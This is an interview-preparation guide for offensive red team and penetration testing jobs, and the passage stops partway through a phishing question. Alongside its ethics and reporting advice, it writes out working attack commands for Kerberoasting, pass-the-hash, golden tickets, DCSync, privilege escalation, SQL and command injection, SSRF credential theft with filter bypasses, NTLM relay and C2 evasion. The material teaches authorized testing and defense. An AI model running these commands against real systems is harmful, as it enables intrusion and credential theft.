# 🔴 Offensive Red Teaming — Interview Questions (Corporate Edition)
> **Audience:** Entry-level to Senior Red Team / Penetration Tester roles at MSSPs, Big4, product security teams, banks, and consulting firms  
> **Covers:** Priority questions · Job-switching angles · Scenario/experience-based · Behavioral + Quick Fire Round

---

## 📌 HOW TO USE THIS FILE

| Icon | Category | When It Appears |
|------|----------|----------------|
| 🔴 | Priority / Must-Know | Every interview, regardless of level |
| 🟡 | Job-Switching | Transitioning from dev / sysadmin / blue team |
| 🟢 | Experience / Scenario | Mid-senior level, "walk me through…" format |
| 🔵 | Behavioral | Culture fit, ethics, teamwork |
| ⚡ | Quick Fire Round | Rapid terminology checks at the end |

---

## 🔴 SECTION 1 — PRIORITY QUESTIONS (Must-Know for Every Interview)

---

### Q1. Walk me through your complete penetration testing methodology from scoping to reporting.

**What they're testing:** Structured thinking, professionalism, real-world process knowledge.

**Answer Framework:**

```
Phase 1: Pre-Engagement
├── Define scope (IP ranges, domains, systems in/out of scope)
├── Rules of Engagement (RoE) document signed
├── Emergency contacts, escalation paths
├── Legal authorization (NDA, Statement of Work, get-out-of-jail letter)
└── Kick-off call with client technical team

Phase 2: Reconnaissance
├── Passive: OSINT — Shodan, LinkedIn, WHOIS, Google Dorks, Censys
├── Active: DNS enumeration, port scanning (Nmap), web crawling
└── Asset discovery: subdomain enum (Amass, Subfinder), cloud assets

Phase 3: Scanning & Enumeration
├── Nmap service/version detection
├── Vulnerability scanning (Nessus/OpenVAS)
├── Web: directory brute force (Feroxbuster), tech fingerprinting (Wappalyzer)
└── SMB/LDAP/RPC enumeration for AD environments

Phase 4: Exploitation
├── Validate vulnerabilities (no assumption — must verify)
├── Use PoC exploits (carefully, no DoS risk unless authorized)
├── Web: OWASP Top 10 testing
└── Prioritize: critical → high → medium

Phase 5: Post-Exploitation
├── Establish persistence (if in scope)
├── Privilege escalation
├── Lateral movement
├── Data exfiltration simulation (show impact)
└── Screenshot evidence at every step

Phase 6: Reporting
├── Executive Summary (non-technical, business risk language)
├── Technical findings (CVSS score, PoC, affected systems)
├── Remediation steps (specific, actionable)
├── Risk ratings (Critical/High/Medium/Low/Informational)
└── Debrief call with client

Phase 7: Remediation Verification (if contracted)
└── Re-test patched findings
```

**Key points to stress:** Written authorization before every test. Screenshot-based evidence. CVSS scoring. Clear remediation steps. No attribution of blame in reports.

---

### Q2. What is the difference between a vulnerability assessment, penetration test, and red team engagement?

| Aspect | Vulnerability Assessment | Penetration Test | Red Team Engagement |
|--------|--------------------------|-----------------|---------------------|
| Goal | Find all vulnerabilities | Exploit to prove impact | Simulate real APT/adversary |
| Scope | Broad, all assets | Defined and limited | Typically unrestricted (covert) |
| Duration | Days | 1-2 weeks | Weeks to months |
| Stealth | None (loud scans) | Low | High (evade detection) |
| Blue Team aware? | Yes | Usually yes | No (adversarial simulation) |
| Output | List of vulns | Exploited paths + PoC | Attack narrative + detection gaps |
| Cost | Low | Medium | High |
| Methodology | Automated + manual | Mostly manual | Full TTPs like real attackers |

**Real-world:** A bank runs monthly VA scans (Nessus/Qualys), quarterly pentests for key apps, and an annual red team engagement to test SOC detection capabilities.

---

### Q3. Explain Kerberoasting — how it works, detection, and defense.

**How it works:**
```
1. Attacker authenticates to AD (any valid domain user account)
2. Requests Kerberos service tickets (TGS) for accounts with SPNs
   → SPNs = Service Principal Names (e.g., MSSQLSvc/server01.corp.local)
3. TGS ticket is encrypted with the SERVICE ACCOUNT's NTLM hash
4. Attacker extracts ticket offline → cracks with Hashcat/John
5. If service account has weak password → plaintext password recovered
6. Use password to authenticate as service account (often highly privileged)

Command:
  GetUserSPNs.py -request -dc-ip 192.168.1.10 CORP/user:pass
  Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt
  hashcat -a 0 -m 13100 hashes.txt rockyou.txt
```

**Detection:**
- Event ID 4769 — Kerberos service ticket requested with RC4 encryption (0x17) — legitimate services use AES (0x12/0x13)
- Large volume of TGS requests from a single user in short time
- SIEMs: alert on `Ticket Encryption Type = 0x17` for sensitive SPN accounts

**Defense:**
- Use AES256 encryption for service accounts (disable RC4)
- Long, complex, random passwords for service accounts (25+ chars)
- Managed Service Accounts (gMSA) — passwords auto-rotated
- Minimize SPNs — only assign where required
- Tier service accounts — don't make them Domain Admins

---

### Q4. What is AS-REP Roasting and how does it differ from Kerberoasting?

**AS-REP Roasting:**
```
Target: Accounts with "Do not require Kerberos pre-authentication" enabled
Attack:
  1. Request AS-REP for target user WITHOUT pre-authentication
  2. AS-REP response is encrypted with user's NTLM hash
  3. Extract encrypted blob → crack offline

Command:
  GetNPUsers.py -dc-ip 192.168.1.10 CORP/ -usersfile users.txt -format hashcat
  hashcat -a 0 -m 18200 asrep_hashes.txt rockyou.txt
```

**Key difference:**

| | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Requires valid account? | YES (any domain user) | NO (unauthenticated) |
| Target | Service accounts with SPNs | Accounts with pre-auth disabled |
| Ticket encrypted with | Service account hash | User account hash |
| Event ID | 4769 | 4768 |

**Defense:** Never disable Kerberos pre-authentication unless absolutely required. Audit with: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`

---

### Q5. Explain Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) attacks.

**Pass-the-Hash (PtH):**
```
Concept: NTLM authentication uses challenge-response with NTLM hash
         → You don't need plaintext password, just the hash

How:
  1. Dump hashes from compromised machine (Mimikatz, secretsdump)
  2. Use hash directly in authentication:
     mimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>
     Impacket: psexec.py -hashes :<ntlm_hash> admin@192.168.1.10

Limitation: Only works against NTLM, not Kerberos
```

**Pass-the-Ticket (PtT):**
```
Concept: Steal a valid Kerberos TGT or TGS ticket from memory
         → Inject it into your session for authentication

How:
  1. mimikatz: sekurlsa::tickets /export → exports .kirbi files
  2. Inject: kerberos::ptt ticket.kirbi
  3. Now authenticated as that user without knowing password

Golden Ticket = Forged TGT using KRBTGT hash (unlimited, 10-year lifetime)
Silver Ticket = Forged TGS using service account hash (limited to that service)
```

**Detection:** Event IDs 4624 (logon), 4648 (explicit creds), 4768/4769 (Kerberos anomalies). Look for tickets with unusual lifetimes, logons from unexpected hosts.

---

### Q6. How would you enumerate Active Directory without triggering alerts?

**Low-and-slow enumeration strategy:**

```bash
# 1. Native Windows tools (LOLBins — blend in)
net user /domain              # user enumeration
net group "Domain Admins" /domain
nltest /domain_trusts
dsquery user -limit 0         # LDAP query

# 2. PowerView with OPSEC flags
Get-DomainUser -Properties samaccountname,memberof | select -first 20
# → Small queries, not full dump

# 3. BloodHound with Stealth collection mode
SharpHound.exe --CollectionMethod DCOnly --Stealth
# DCOnly = only queries DC, avoids touching member servers
# Stealth = reduces network noise

# 4. LDAP queries through legitimate ports (389/636)
# Looks like normal AD traffic

# 5. Time-based: spread queries over hours, not seconds
```

**What triggers alerts:**
- Massive LDAP queries in seconds (BloodHound default settings)
- Scanning all hosts in subnet simultaneously
- Accessing SYSVOL repeatedly
- Querying KRBTGT account (honeypot trigger)

**OPSEC rules:** Match your traffic to normal business hours. Use existing tools on the machine (avoid dropping new executables). Blend enumeration into normal authentication patterns.

---

### Q7. Explain the OWASP Top 10 — pick 3 and explain exploitation + remediation.

**Full list (2021):**
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, NoSQLi, OS injection)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable & Outdated Components
7. Identification & Authentication Failures
8. Software & Data Integrity Failures
9. Security Logging & Monitoring Failures
10. SSRF

**Deep dive — 3 critical ones:**

**A1 — Broken Access Control:**
```
Example: IDOR (Insecure Direct Object Reference)
  GET /api/invoice?id=1001  → your invoice
  GET /api/invoice?id=1002  → someone else's invoice (broken!)

Exploitation: Enumerate IDs, change user IDs in JWT tokens
Remediation: Server-side access checks for every object request
             Never trust client-provided IDs without validation
```

**A3 — Injection (SQL Injection):**
```
Example: Login bypass
  Username: admin'--
  Query becomes: SELECT * FROM users WHERE user='admin'--' AND pass='...'
  → Comment kills password check

Exploitation: sqlmap -u "http://site.com/login" --data "user=a&pass=b" --dbs
Remediation: Parameterized queries / prepared statements
             Input validation, WAF, least privilege DB accounts
```

**A10 — SSRF (Server-Side Request Forgery):**
```
Example: Image upload that fetches from URL
  url=http://169.254.169.254/latest/meta-data/iam/credentials
  → Fetches AWS instance metadata → steals IAM role credentials

Exploitation: Access internal services, cloud metadata, internal APIs
Remediation: Allowlist of permitted URLs, block private IP ranges
             Disable unnecessary URL fetch features
```

---

### Q8. How do you perform privilege escalation on Windows?

**Systematic checklist:**

```powershell
# 1. System information
systeminfo | findstr /B /C:"OS" /C:"Hotfix"
whoami /priv  ← look for SeImpersonatePrivilege, SeDebugPrivilege

# 2. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 3. Weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# 4. Scheduled tasks with weak file permissions
schtasks /query /fo LIST /v | findstr "Task To Run"

# 5. AlwaysInstallElevated (registry)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 6. DLL Hijacking
  → Process Monitor: filter for "NAME NOT FOUND" + ".dll"
  → Drop malicious DLL in writable path

# 7. Token impersonation (Potato attacks)
  → SeImpersonatePrivilege → PrintSpoofer, GodPotato, JuicyPotato

# 8. Stored credentials
cmdkey /list
dir /s /b *pass* *cred* *vnc* *.config*

# Automated: WinPEAS, PowerUp.ps1, Seatbelt.exe
```

**Most common in real engagements:** SeImpersonatePrivilege (service accounts), unquoted service paths, weak ACLs on service binaries.

---

### Q9. How do you perform privilege escalation on Linux?

```bash
# 1. SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
# → Check GTFOBins for exploitation

# 2. Sudo misconfigurations
sudo -l
# → (ALL:ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/bash \;

# 3. World-writable files / scripts run by cron as root
ls -la /etc/cron*
cat /etc/crontab
find / -writable -type f 2>/dev/null | grep -v proc

# 4. Capabilities
getcap -r / 2>/dev/null
# → python3.8 = cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 5. Kernel exploits
uname -a → check for DirtyPipe (CVE-2022-0847), PwnKit (CVE-2021-4034)

# 6. PATH hijacking
echo $PATH → writable dir before system bins?
# → Create fake "ls" in writable dir, trigger with sudo

# 7. NFS no_root_squash
showmount -e target-ip → mount and write SUID binary

# Automated: LinPEAS, linux-smart-enumeration (lse.sh), linEnum
```

---

### Q10. Explain BloodHound — what it is, how you use it, and what attack paths it reveals.

**What it is:**
> BloodHound is an Active Directory attack path mapping tool that uses graph theory to reveal hidden, complex privilege escalation and lateral movement paths that would be invisible to manual analysis.

**Collection → Analysis flow:**
```
Collection (SharpHound / BloodHound.py):
  SharpHound.exe -c All --outputdirectory C:\Temp\
  bloodhound-python -u user -p pass -d corp.local -c All -ns 192.168.1.10

Upload to BloodHound GUI → Neo4j graph database

Key pre-built queries:
  ► Find All Domain Admins
  ► Shortest Path to Domain Admin
  ► Find Principals with DCSync Rights
  ► Find Computers where Domain Users are Local Admin
  ► Find AS-REP Roastable Users
  ► Find Kerberoastable Users
  ► Shortest Path from Kerberoastable Users to Domain Admin
  ► Find Accounts with Unconstrained Delegation
```

**What attack paths look like:**
```
Compromised User → GenericAll on Group → AddMember → Domain Admins
Compromised User → WriteDACL on OU → Modify ACL → Own all child objects
Compromised Service Account → AllowedToDelegate → DCSync (constrained delegation abuse)
```

**Why interviewers love this question:** It tests whether you understand AD trust relationships beyond just "dump hashes."

---

### Q11. What is a Golden Ticket attack and when would you use it in an engagement?

**Golden Ticket:**
```
Requirements: KRBTGT account's NTLM hash (from DCSync or Domain Controller compromise)

Creation:
  mimikatz: kerberos::golden /user:Administrator /domain:corp.local 
            /sid:S-1-5-21-xxx /krbtgt:<hash> /id:500
  → Creates forged TGT with unlimited lifetime

Impact:
  ✗ Bypasses ALL Kerberos authentication checks
  ✗ Works even after password resets (uses KRBTGT hash, not user hash)
  ✗ Persistent access for up to 20 years
  ✗ Survives account deletion
```

**When to use in an engagement:**
- After obtaining Domain Admin — demonstrate maximum persistence impact
- Show client that compromising KRBTGT = permanent domain compromise
- Requires dual KRBTGT password reset to remediate (rare knowledge)

**Detection:**
- Tickets with lifetimes > 10 hours (Microsoft max is 10hr)
- RC4 encryption type when environment uses AES
- User logons from unexpected hosts
- Event ID 4769 with unusual encryption types

**Remediation:** Reset KRBTGT password TWICE (48-hour gap) — both old and new versions must expire.

---

### Q12. Explain DCSync attack — requirements, execution, and impact.

**What it is:**
> DCSync mimics Domain Controller replication behavior to request password hashes for any account (including KRBTGT, Administrator) without touching the DC itself.

**Requirements:**
- Account with `DS-Replication-Get-Changes` AND `DS-Replication-Get-Changes-All` rights
- (Default holders: Domain Admins, Enterprise Admins, Domain Controllers)
- If you find GenericAll or WriteDACL on the domain object → can grant yourself this right

**Execution:**
```bash
# Impacket (from Linux):
secretsdump.py -just-dc CORP/admin:password@192.168.1.10

# Mimikatz (from Windows):
lsadump::dcsync /domain:corp.local /all /csv
lsadump::dcsync /domain:corp.local /user:krbtgt
```

**Output:**
```
[*] Dumping Domain Credentials
corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:036ce49a34b7a14a6d6d5c3bc8a4c73a:::
```

**Impact:** Complete domain compromise — all hashes = all accounts = total control.

**Detection:**
- Event ID 4662 — DS-Replication-Get-Changes from non-DC machine
- Replmon / DRS replication events from non-DC IPs

---

### Q13. How do you approach a web application penetration test?

**Methodology:**

```
Reconnaissance:
  → Identify tech stack (Wappalyzer, BuiltWith, response headers)
  → Directory/file discovery (Feroxbuster, dirsearch, gobuster)
  → API endpoint discovery (Swagger/OpenAPI, JS analysis with LinkFinder)
  → Subdomain enumeration, virtual host discovery

Authentication Testing:
  → Default credentials, brute force protection
  → Password reset flow flaws (IDOR in reset tokens)
  → Multi-factor bypass (response manipulation, code reuse)
  → JWT analysis (alg:none, weak secret, kid injection)

Authorization Testing (most impactful):
  → IDOR: change user IDs, GUIDs in all parameters
  → Horizontal privilege escalation (user A accessing user B's data)
  → Vertical privilege escalation (regular user → admin function)
  → Mass assignment (add "role":"admin" to registration request)

Injection:
  → SQLi: all input fields, headers (User-Agent, X-Forwarded-For)
  → XSS: reflected, stored, DOM-based
  → SSTI: {{7*7}}, ${7*7} in template fields
  → Command injection: ;id, |whoami, `id`
  → SSRF: URL parameters, webhook URLs, import functions
  → XXE: XML upload features, SOAP endpoints

Session Management:
  → Cookie security flags (HttpOnly, Secure, SameSite)
  → Session fixation, session not invalidated after logout
  → Token predictability

Business Logic:
  → Race conditions (parallel requests for limited resources)
  → Negative price, integer overflow in quantities
  → Workflow bypass (skip payment step)
  → File upload: MIME type bypass, polyglot files, path traversal

Tools: Burp Suite (primary), OWASP ZAP, sqlmap, ffuf, nikto
```

---

### Q14. What is SSRF and how do you escalate it to critical impact?

**SSRF (Server-Side Request Forgery):**
```
Basic: Make server fetch an attacker-controlled URL
  → probe: http://127.0.0.1:PORT → internal service enumeration

Escalation paths:
1. Cloud Metadata → IAM Credential Theft
   http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
   → Returns AWS Access Key + Secret → pivot to full AWS account

2. Internal Service Access
   http://localhost:6379 → Redis (unauthenticated, inject commands)
   http://localhost:9200 → Elasticsearch (no auth → data dump)
   http://localhost:8500 → Consul (config management, RCE via service registration)

3. File Read (file:// scheme if allowed)
   file:///etc/passwd
   file:///proc/self/environ

4. Port Scanning (time-based, response size differences)
   http://192.168.1.x:PORT → map internal network

5. SSRF to RCE
   → SSRF to internal Jenkins → build job with command execution
   → SSRF to internal GitLab → webhook to localhost service
```

**Bypass techniques for SSRF filters:**
```
→ DNS rebinding
→ http://0x7f000001 (hex encoding of 127.0.0.1)
→ http://127.1 (short IP)
→ http://spoofed.attacker.com → resolves to 127.0.0.1
→ http://[::1] (IPv6 localhost)
→ http://localhost%00.attacker.com (null byte)
```

---

### Q15. Explain your understanding of MITRE ATT&CK and how you use it in red team operations.

**What it is:**
> MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics, techniques, and sub-techniques based on real-world observations. It provides a common language for red/blue teams.

**Structure:**
```
Enterprise Matrix:
  14 Tactics (WHY — adversary goal):
    TA0001 Initial Access → TA0002 Execution → TA0003 Persistence
    TA0004 Privilege Escalation → TA0005 Defense Evasion
    TA0006 Credential Access → TA0007 Discovery → TA0008 Lateral Movement
    TA0009 Collection → TA0010 Exfiltration → TA0011 Command & Control
    TA0040 Impact → TA0042 Resource Development → TA0043 Reconnaissance

  Techniques (WHAT — specific method)
  Sub-techniques (HOW — implementation detail)

Example mapping:
  Kerberoasting = T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)
  Mimikatz lsass dump = T1003.001 (OS Credential Dumping: LSASS Memory)
  PowerShell download cradle = T1059.001 (Command & Scripting: PowerShell)
```

**How I use it in engagements:**
1. **Planning:** Select techniques matching target threat profile (e.g., APT29 for nation-state simulation)
2. **Execution:** Tag each action in notes with ATT&CK technique ID
3. **Reporting:** Map all findings to ATT&CK → gives client structured remediation priority
4. **Gap analysis:** Show which techniques the blue team detected vs missed

**Tools:** ATT&CK Navigator (heat map), Caldera (automated adversary simulation), Vectr (tracking)

---

### Q16. What are your Rules of Engagement and why are they critical?

**Rules of Engagement (RoE) must define:**

```
✅ Scope: Exact IP ranges, domains, applications IN scope
✅ Exclusions: Critical prod systems, third-party SaaS, disaster recovery
✅ Authorized techniques: What's allowed (exploit? DoS? social eng?)
✅ Authorized hours: 9-5 only? 24x7? (affects stealth too)
✅ Emergency contacts: Who to call if you accidentally take something down
✅ Notification list: Who knows about the test (keep blue team blind?)
✅ Data handling: How to handle found credentials/PII
✅ Geographic restrictions: Cloud regions, countries
✅ Third-party rules: AWS/Azure require advance notice
✅ Stop conditions: Situations requiring immediate halt (e.g., find real breach)
```

**Why critical (real story):**
> In a 2019 Coalfire incident, two authorized physical pentesters were arrested by local police — the client's security team called police instead of checking the authorized list. Always: carry physical letter of authorization, have 24/7 client contact who can vouch for you.

**What you say if asked to do something outside RoE:**
"That's outside our defined scope. I need written authorization from [client contact] before proceeding. Let's document this as a finding recommendation instead."

---

### Q17. How do you write a penetration testing report that executives AND technical teams can use?

**Report Structure:**

```
1. Cover Page
   → Client name, date, classification (CONFIDENTIAL), test type

2. Executive Summary (1-2 pages — for CXO/Board)
   → Overall risk rating (Critical/High/Medium/Low)
   → Business impact in plain English (NOT "SQL injection found")
   → Key findings summary (top 3-5 with business risk)
   → Positive security controls observed
   → Strategic recommendations

3. Scope & Methodology
   → What was tested, what was not
   → Testing dates, testers
   → Methodology used (PTES, OWASP, custom)

4. Executive Risk Dashboard
   → Pie chart: findings by severity
   → CVSS score distribution

5. Technical Findings (one page per finding)
   → Finding title + severity rating
   → Affected systems/components
   → CVSS v3.1 score breakdown
   → Description (what it is)
   → Evidence (screenshots, command output, Burp request/response)
   → Business risk (what attacker can do)
   → Remediation (specific, version-specific fixes)
   → References (CVE, CWE, OWASP link)

6. Attack Chain / Kill Chain Narrative
   → Walkthrough of how full compromise was achieved
   → MITRE ATT&CK mapping

7. Appendices
   → Full scope list, tool list, raw output
```

**Tone rules:**
- Never blame individuals or teams
- Remediation steps must be actionable (not "fix the vulnerability")
- Severity ratings must be justified (CVSS vectors shown)
- Executive summary: think newspaper headline — "Attacker could steal all customer data"

---

## 🟡 SECTION 2 — JOB-SWITCHING QUESTIONS

---

### Q18. You're a developer/software engineer switching to red teaming. What's your edge?

**Your genuine advantages:**

```
✅ Code Review:
   → You understand how apps are built → know where devs cut corners
   → Spot business logic flaws others miss (auth flow, state machine)
   → Read source code during assessments (if available)

✅ API Understanding:
   → REST/GraphQL internals → test authentication, authorization edge cases
   → Understand how microservices communicate → SSRF paths

✅ Scripting/Automation:
   → Write custom exploits, automation scripts, payload generators
   → Modify public PoCs to bypass specific defenses

✅ Infrastructure Knowledge:
   → CI/CD pipelines → attack surface (GitHub Actions, Jenkins)
   → Container escape, Kubernetes misconfigs

✅ Reverse Engineering Foundation:
   → Understand compiled code behavior
```

**What you need to build:**
- Network fundamentals (TCP/IP, protocols) — likely weakest area for devs
- Active Directory attacks (Kerberos, LDAP, group policy)
- Penetration testing methodology (PTES/OWASP)
- Certifications: eJPT → OSCP → CRTO

**How to frame in interview:**
> "My dev background means I approach web app testing differently — I look for architectural flaws, not just surface-level injections. I've already built custom Burp extensions and written exploit scripts for CTF challenges."

---

### Q19. You're a sysadmin/network engineer switching to red teaming. What's your edge?

**Your genuine advantages:**

```
✅ Infrastructure Knowledge:
   → Understand Active Directory deeply (GPO, OU structure, trusts)
   → Network architecture → know where segmentation is weak
   → Firewall rules → know what's actually blocked vs what you assume

✅ Operational Awareness:
   → Know what "normal" looks like → better OPSEC (blend in)
   → Know which logs are kept, where, for how long

✅ Hands-on Tool Experience:
   → Wireshark, packet captures → spot attack patterns
   → PowerShell, bash scripting at production level

✅ Physical Access Context:
   → Understand data center layouts, badge systems
```

**What to build:**
- Web application testing skills (OWASP Top 10)
- Exploit development basics
- Scripting: Python for custom tools
- Certifications: OSCP (most valued for background like yours)

---

### Q20. You're a blue teamer / SOC analyst switching to red teaming. What's your edge?

**This is the most valuable background:**

```
✅ Detection Knowledge:
   → You know what triggers alerts → expert OPSEC
   → Know which logs are monitored → fly under radar
   → Understand EDR behavior → evasion techniques

✅ Adversary Mindset Already Developing:
   → Reviewed thousands of attack attempts → pattern recognition
   → Know real attacker TTPs from incident response

✅ MITRE ATT&CK Expertise:
   → Mapped detections to ATT&CK → understand technique landscape

✅ Communication with Blue Team:
   → Can explain findings in terms blue team understands
   → Better at purple team exercises (extremely valued)
```

**What to build:**
- Offensive tooling hands-on (Metasploit, Impacket, BloodHound, Cobalt Strike)
- Web application testing (different from network attacks)
- Exploitation techniques beyond theory
- Certifications: CRTO (Cobalt Strike focused) + OSCP

**How to frame:**
> "The most dangerous red teamer is one who thinks like a defender. I know exactly which of my actions generate which alerts. That means I can be more surgical, move slower, and complete engagements that more tool-heavy operators would fail."

---

### Q21. How do you demonstrate red team skills without a lot of professional experience?

**Legitimate evidence that carries weight:**

```
1. HTB / TryHackMe / PentesterLab Profiles
   → Show active Hack The Box profile with Pro Hacker+ rank
   → Completed OWASP path, AD exploitation path
   → Screenshots of rooted machines

2. CTF Participation
   → Write public CTF writeups on a blog/GitHub
   → Place in team competitions

3. Home Lab
   → GOAD (Game of Active Directory) — realistic AD environment
   → Show BloodHound path screenshots from your lab
   → Document your attack chains

4. Bug Bounty
   → Even 1 accepted finding on HackerOne/Bugcrowd is powerful
   → Shows real-world testing, responsible disclosure

5. Certifications
   → OSCP — the gold standard, proves practical ability
   → eJPT — good starting point
   → CRTO — Cobalt Strike + red team ops

6. GitHub / Technical Blog
   → Custom tools, scripts, modifications of existing tools
   → Write-ups on vulnerability research

7. Open Source Contributions
   → PRs to Impacket, BloodHound, Metasploit, etc.
```

**Tip:** A hiring manager looking at two candidates — one with "5 years pentest experience" on a resume and one with an OSCP + active HTB Pro Hacker + 20 CTF writeups will often choose the demonstrated skills.

---

### Q22. What salary range should you expect when switching to red teaming?

**India market benchmarks (2024-2025):**

| Level | Experience | Salary Range | Key Requirement |
|-------|-----------|-------------|----------------|
| Junior Pentester | 0-2 yrs | ₹5-10 LPA | eJPT/CEH + HTB/TryHackMe |
| Mid-level | 2-4 yrs | ₹10-18 LPA | OSCP + specialization |
| Senior Pentester | 4-7 yrs | ₹18-30 LPA | OSCP + CRTO/CRTE |
| Red Team Lead | 7+ yrs | ₹28-45 LPA | All certs + C2 expertise |
| Principal/Manager | 10+ yrs | ₹40-70+ LPA | Leadership + client management |

**With career switch premium:**
- Dev → Red Team (with OSCP): can expect 20-40% salary bump vs current dev role in 6-12 months
- Blue Team → Red Team: lateral move initially, then 30%+ growth

---

## 🟢 SECTION 3 — EXPERIENCE-BASED / SCENARIO QUESTIONS

---

### Q23. Walk me through a real (or simulated) penetration test engagement end-to-end.

**Sample answer (using a realistic engagement scenario):**

> "In a recent engagement for a mid-size financial services client, I was given a 2-week external + internal pentest scope.

> **External phase:** I started with passive OSINT — found employee emails through LinkedIn, identified their VPN portal via Shodan, and noticed an exposed Citrix gateway running an outdated version. I used the CVE-2019-19781 PoC to test it and confirmed RCE on the Citrix ADC — immediately reported this as critical and paused exploitation to notify the client's emergency contact per our RoE.

> **Internal phase (after client remediation of critical finding):** They gave me VPN access for internal testing. Running BloodHound with DCOnly collection, I found a path: a standard user account had GenericWrite over a group, that group had local admin rights on 6 servers, and one of those servers had a service account with unconstrained delegation.

> **Attack chain:** Compromised service account via Kerberoasting (weak password cracked in 4 minutes) → local admin on 6 servers → found cached Domain Admin credentials in one server's LSASS → DCSync → dumped all domain hashes including KRBTGT.

> **Report:** Mapped entire chain to MITRE ATT&CK. Executive summary showed a 3-step path from external internet to full domain compromise. Recommended: patch Citrix, enforce Tier 0/1/2 model, disable unconstrained delegation, enforce gMSA for service accounts."

---

### Q24. You're mid-engagement and find evidence of an active breach by another attacker. What do you do?

**This is a critical judgment question — there's a right answer.**

**Immediate actions:**
```
1. STOP all offensive activities immediately
2. Document what you found (screenshots, timestamps, IOCs)
   → Preserve evidence without modifying artifacts
3. Notify client emergency contact immediately (not just PM)
   → Use out-of-band channel (phone call, not email that might be compromised)
4. Do NOT investigate further — you're not an IR team
5. Do NOT remove the attacker's tools (destroys forensic evidence)
6. Provide client with IOCs you observed for their IR team
7. Formally document incident in your engagement log
8. Await client decision: pause/continue/terminate engagement
```

**What NOT to do:**
- Continue testing (you'd be contaminating incident evidence)
- Try to "kick out" the attacker yourself
- Assume it's another authorized team's test (always verify)
- Keep it secret from the client

**Why this matters:** Several real cases exist where pentesters found actual ransomware staging — the tester who handled it correctly helped the client respond; the one who continued testing faced legal liability.

---

### Q25. How would you approach an internal network pentest where you start with just a network cable jack?

**Starting from zero — physical/assumed breach scenario:**

```
Step 1: Network Access
  → Plug in, get IP via DHCP → note subnet, gateway, DNS server
  → DNS server is often the Domain Controller
  → Responder (passive) to capture hashes from broadcast traffic:
    responder -I eth0 -A  (analysis mode — listen only first)

Step 2: Initial Enumeration
  → Nmap: nmap -sn 192.168.1.0/24 (host discovery)
  → Identify DC: nmap -p 88,389,636,3268 <range> → open on DC
  → SMB signing check: crackmapexec smb <range> --gen-relay-list targets.txt

Step 3: LLMNR/NBT-NS Poisoning
  → Run Responder: responder -I eth0 -wF
  → Capture NTLMv2 hashes from workstations making broadcast queries
  → Crack hashes OR relay them (if SMB signing disabled)

Step 4: NTLM Relay (if SMB signing off)
  → ntlmrelayx.py -tf targets.txt -smb2support -socks
  → Wait for authentication events → relay to get access

Step 5: From Initial Foothold
  → BloodHound collection → attack path analysis
  → Follow discovered attack chain to Domain Admin

Step 6: Document everything
  → Screenshot every step with timestamps
  → Log commands run and output
```

---

### Q26. You've compromised a workstation but your C2 callbacks are being blocked. How do you re-establish communication?

**C2 evasion strategies:**

```
1. Protocol pivoting
   → Switch from HTTP/HTTPS to DNS C2 (dnscat2, Cobalt Strike DNS)
   → DNS rarely fully blocked outbound
   → ICMP tunneling (icmptunnel, ptunnel)

2. Domain Fronting
   → Route C2 traffic through legitimate CDN (Cloudflare, Azure CDN)
   → Looks like traffic to Microsoft/Amazon → hard to block
   → SNI header points to legit domain, Host header routes to your server

3. Legitimate Cloud Services
   → C2 over Slack API, Teams webhooks, Discord
   → Exfiltration via OneDrive/SharePoint API (matches business traffic)
   → GitHub issues as C2 (unlikely to be blocked)

4. Living off the Land
   → Use built-in OS features: certutil, bitsadmin, mshta, regsvr32
   → PowerShell web requests through corporate proxy

5. Proxy-Aware Payloads
   → Configure Cobalt Strike/Havoc to use system proxy settings
   → Most corporate proxies allow HTTPS on port 443

6. Sleep + Jitter
   → Long beacon intervals (4+ hours) with jitter to avoid timing patterns
   → Reduces detection probability significantly

7. SMB Peer-to-Peer C2
   → Route C2 through internal pivot host that does have outbound access
   → SMB beacon on isolated host → pivots through internet-connected host
```

---

### Q27. You find a critical vulnerability that's out of scope. What do you do?

**The ethical and professional answer:**

```
1. Document it thoroughly (evidence, screenshots, affected system)
2. Stop testing that component — don't exploit further
3. Report to client contact immediately (same day, not in final report)
   → "While testing [in-scope system], we identified what appears to be 
      a critical vulnerability in [out-of-scope system]. We have not 
      tested or exploited this. We wanted to bring it to your attention 
      immediately so you can assess the risk."
4. Ask client: do they want to expand scope (with written authorization)?
5. Document the notification in your engagement log with timestamp
6. Include in final report as "Out-of-Scope Observation"
```

**What NOT to do:**
- Exploit it because "it's critical" — this creates legal liability
- Ignore it — you have ethical obligation to report
- Continue testing hoping it's in scope

**Professional framing:**
> Responsible disclosure and ethics are what separate authorized security professionals from criminals. The authorization boundary is not negotiable.

---

### Q28. How do you perform phishing as part of a red team engagement?

**Phishing engagement methodology:**

```
Pre-engagement:
  → Define: credential harvest / malware delivery / callback / MFA bypass?
  → Get explicit written authorization for phishing
  → Agree on: target employees, departments, notification contacts
  → Do NOT target executives without specific authorization

Infrastructure setup (OPSEC):
  → Domain: aged domain (30+ days), categorized, DMARC/DKIM/SPF configured
  → Hosting: reputable VPS, not blacklisted IP range
  → Redirector: Apache/Nginx mod_rewrite rules → filter non-targets
  → SSL: Let's Encrypt cert (green lock)
  → GoPhish / Evilginx2 / Modlishka for proxy-based MFA bypass

Pretext development:
